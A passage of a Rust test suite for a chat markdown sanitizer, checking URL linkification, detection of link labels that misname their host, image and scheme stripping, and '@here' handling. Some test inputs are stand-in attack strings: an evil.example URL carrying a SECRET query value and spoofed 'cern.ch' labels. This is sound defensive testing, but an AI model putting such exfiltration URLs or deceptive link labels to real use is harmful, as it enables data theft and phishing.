            "go www.evil.example/?d=SECRET now",
            "go [www.evil.example/?d=SECRET](https://www.evil.example/?d=SECRET) now",
        ),
        (
            "(www.a.example)",
            "([www.a.example](https://www.a.example))",
        ),
        (
            "<www.a.example/x>",
            "<[www.a.example/x](https://www.a.example/x)>",
        ),
        ("WWW.A.EXAMPLE", "[WWW.A.EXAMPLE](https://WWW.A.EXAMPLE)"),
        ("ftp://h.example/p.", "ftp:\\//h.example/p."),
        (
            "<div>www.evil.example/x</div>",
            "<div><a href=\"https://www.evil.example/x\">www.evil.example/x</a></div>",
        ),
        (
            "<div>ftp://h.example/p</div>",
            "<div>ftp&#58;//h.example/p</div>",
        ),
    ] {
        let out = md(src);
        assert_eq!(out, want, "{src}");
        assert!(!bare_url_left(&out), "{src} -> {out}");
        assert_eq!(md(&out), out, "idempotent: {src}");
    }
    // Untouched: code, links already written as links, mail addresses, no scheme, other schemes.
    for same in [
        "`https://a.example`",
        "```\nhttps://a.example/x\n```",
        "    https://a.example/indented-code",
        "[x](https://a.example)",
        "[https://a.example](https://a.example)",
        "[r]: https://a.example/\n\n[x][r]",
        "<a@b.example>",
        "example.org/path and awww.example.org and foo.www.example.org and x@www.example.com",
        "mailto:a@b.example",
        "www and www. and www.-x",
    ] {
        assert_eq!(md(same), same, "{same:?}");
    }
    // The label of a link may name a URL (that is a link, not a bare one), with rule 2's note.
    assert_eq!(
        md("[https://cern.ch](https://evil.example/x)"),
        "[https://cern.ch](https://evil.example/x) (→ evil.example)"
    );
}

#[test]
fn link_host_lie_names_the_real_host() {
    assert_eq!(
        link_host_lie("https://cern.ch", "https://evil.example/x"),
        Some("evil.example".to_owned())
    );
    assert_eq!(link_host_lie("cern.ch", "https://www.cern.ch/x"), None);
    // Closing punctuation after the name does not hide it.
    for label in [
        "https://cern.ch]",
        "cern.ch.",
        "(cern.ch)",
        "https://cern.ch,",
    ] {
        assert_eq!(
            link_host_lie(label.trim_start_matches('('), "https://evil.example/x"),
            Some("evil.example".to_owned()),
            "{label}"
        );
    }
    assert_eq!(link_host_lie("read this", "https://evil.example"), None);
    assert_eq!(
        link_host_lie("cern.ch", "https://evil.example\\@cern.ch"),
        Some("evil.example".to_owned())
    );
    // A destination with a space is still a destination (Mattermost keeps it).
    assert_eq!(
        link_host_lie("https://cern.ch", "https://evil.example/a b"),
        Some("evil.example".to_owned())
    );
}

#[test]
fn here_inside_html_code_is_code() {
    for src in [
        "see <code>@here</code> now",
        "<code>@here</code>",
        "<pre>@here</pre>",
        "<kbd>@here</kbd> and <code>x @HERE y</code>",
    ] {
        let out = broadcast_here(&md(src));
        assert!(!out.contains("<@here>"), "{src} -> {out}");
    }
    // Outside the tag it still is a broadcast.
    assert!(broadcast_here(&md("<code>x</code> @here")).contains("<@here>"));
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(400))]

    #[test]
    fn any_input_is_safe_idempotent_and_never_panics(s in prop_oneof![fragments(), any::<String>()]) {
        let out = markdown_safe(&s, 5_000);
        prop_assert!(out.chars().count() <= 5_000 * 3);
        for (e, _) in Parser::new_ext(&out, options()).into_offset_iter() {
            match e {
                Event::Start(Tag::Image { .. }) => prop_assert!(false, "image survived: {out:?}"),
                Event::Start(Tag::Link { dest_url, link_type, .. }) => prop_assert!(
                    allowed_url(&dest_url) || matches!(link_type, LinkType::Email),
                    "link scheme survived: {out:?}"
                ),
                Event::Html(h) | Event::InlineHtml(h) => prop_assert!(sanitize_html(&h) == *h, "html not canonical: {out:?}"),
                _ => {}
            }
        }
        prop_assert!(no_live_image_opener(&out), "image opener survived: {out:?}");
        prop_assert!(!loose_joint(&out), "link joint survived: {out:?}");
        prop_assert!(!bare_url_left(&out), "bare url survived: {out:?}");
        prop_assert!(!html_bare_url_left(&out), "bare url in html text survived: {out:?}");
        // A backslash-escaped `\<` (the data fallback) is inert text, not a token.
        prop_assert!(!has_token(&out.replace("\\<", "")), "token formed: {out:?}");
        prop_assert!(out.chars().all(|c| !is_stripped(c) || c == '\u{200B}'), "stripped char: {out:?}");
        prop_assert_eq!(markdown_safe(&out, 5_000), out.clone());
        // `<@here>` exists only when the core adds it.
        prop_assert!(!out.contains("<@here>"));
    }

    #[test]
    fn broadcast_here_never_adds_more_than_standalone_mentions(s in fragments()) {
        let safe = markdown_safe(&s, 5_000);
        let b = broadcast_here(&safe);
        prop_assert!(b.matches("<@here>").count() <= safe.to_ascii_lowercase().matches("@here").count());
        // Nothing but `@here` → `<@here>` changed.
        prop_assert_eq!(b.replace("<@here>", "@here").to_ascii_lowercase(), safe.to_ascii_lowercase());
    }
}
